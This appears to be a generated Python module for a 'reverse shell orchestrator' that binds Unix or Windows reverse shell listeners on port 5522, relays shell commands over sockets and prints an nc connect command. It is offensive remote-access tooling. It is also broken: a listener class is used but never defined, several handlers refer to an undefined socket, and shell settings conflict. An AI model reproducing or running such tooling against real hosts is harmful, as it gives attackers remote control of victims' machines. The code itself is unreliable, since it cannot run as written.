from TASK_001_models import ExecutionResult, ReverseShellConfig
from TASK_003_windows_reverse_shell import WindowsReverseShellListener
import argparse
import os
import select
import socket
import struct
import sys
import threading
import time


def create_reverse_shell_server(config: ReverseShellConfig) -> tuple[UnixReverseShellListener | WindowsReverseShellListener, ExecutionResult]:
    """Create a reverse shell server instance based on the selected platform."""
    if config.shell_type == 'unix':
        listener = UnixReverseShellListener(config)
    else:
        listener = WindowsReverseShellListener(config)
    result = listener.start()
    return listener, result


def run_unix_listener(config: ReverseShellConfig | None = None) -> ExecutionResult:
    """Run the Unix reverse shell listener in a non-blocking mode."""
    if config is None:
        config = ReverseShellConfig(host='0.0.0.0', port=5522, timeout=30.0, shell_type='/bin/sh')
    listener = UnixReverseShellListener(config)
    result = listener.start()
    return result


def run_windows_listener(config: ReverseShellConfig | None = None) -> ExecutionResult:
    """Run the Windows reverse shell listener in a non-blocking mode."""
    if config is None:
        config = ReverseShellConfig(host='0.0.0.0', port=5522, timeout=30.0, shell_type='cmd.exe')
    listener = WindowsReverseShellListener(config)
    result = listener.start()
    return result


def _handle_connection(conn: socket.socket, client_socket: socket.socket) -> None:
    """Handle a single client connection by spawning a subprocess."""
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            command = data.decode('utf-8', errors='replace').strip()
            if not command:
                continue

            result_queue = []

            def handle_client():
                try:
                    client_socket.sendall(command.encode('utf-8'))
                    response = client_socket.recv(4096)
                    if response:
                        result_queue.append(response.decode('utf-8', errors='replace').strip())
                except Exception as e:
                    result_queue.append(f"Error: {str(e)}")

            thread = threading.Thread(target=handle_client, daemon=True)
            thread.start()

            time.sleep(0.1)
            if result_queue and result_queue[0]:
                output = result_queue[0]
                client_socket.sendall(output.encode('utf-8'))
    except Exception as e:
        try:
            client_socket.sendall(f"Error: {str(e)}".encode('utf-8'))
        except Exception:
            pass


def _handle_unix_connection(conn: socket.socket) -> None:
    """Handle a Unix reverse shell connection."""
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            command = data.decode('utf-8', errors='replace').strip()
            if not command:
                continue

            result_queue = []

            def handle_client():
                try:
                    client_socket.sendall(command.encode('utf-8'))
                    response = client_socket.recv(4096)
                    if response:
                        result_queue.append(response.decode('utf-8', errors='replace').strip())
                except Exception as e:
                    result_queue.append(f"Error: {str(e)}")

            thread = threading.Thread(target=handle_client, daemon=True)
            thread.start()

            time.sleep(0.1)
            if result_queue and result_queue[0]:
                output = result_queue[0]
                client_socket.sendall(output.encode('utf-8'))
    except Exception as e:
        try:
            client_socket.sendall(f"Error: {str(e)}".encode('utf-8'))
        except Exception:
            pass


def _handle_windows_connection(conn: socket.socket) -> None:
    """Handle a Windows reverse shell connection."""
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            command = data.decode('utf-8', errors='replace').strip()
            if not command:
                continue

            result_queue = []

            def handle_client():
                try:
                    client_socket.sendall(command.encode('utf-8'))
                    response = client_socket.recv(4096)
                    if response:
                        result_queue.append(response.decode('utf-8', errors='replace').strip())
                except Exception as e:
                    result_queue.append(f"Error: {str(e)}")

            thread = threading.Thread(target=handle_client, daemon=True)
            thread.start()

            time.sleep(0.1)
            if result_queue and result_queue[0]:
                output = result_queue[0]
                client_socket.sendall(output.encode('utf-8'))
    except Exception as e:
        try:
            client_socket.sendall(f"Error: {str(e)}".encode('utf-8'))
        except Exception:
            pass


def main() -> None:
    """Main entry point for the reverse shell orchestrator."""
    parser = argparse.ArgumentParser(description='Reverse Shell Orchestrator')
    parser.add_argument('--host', type=str, default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5522, help='Port to listen on')
    parser.add_argument('--timeout', type=float, default=30.0, help='Connection timeout in seconds')
    parser.add_argument('--shell-type', type=str, choices=['unix', 'windows'], default='unix', help='Shell type')

    args = parser.parse_args()

    config = ReverseShellConfig(
        host=args.host,
        port=args.port,
        timeout=args.timeout,
        shell_type=args.shell_type
    )

    if args.shell_type == 'unix':
        listener = UnixReverseShellListener(config)
    else:
        listener = WindowsReverseShellListener(config)

    result = listener.start()

    if result.exit_code != 0:
        print(f'Failed to start: {result.error_messages}')
        sys.exit(1)

    print(f'Reverse shell listener is running on {config.host}:{config.port}')
    print('Connect with: nc -v ' + config.host + ' ' + str(config.port))

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    listener.stop()


if __name__ == '__main__':
    main()
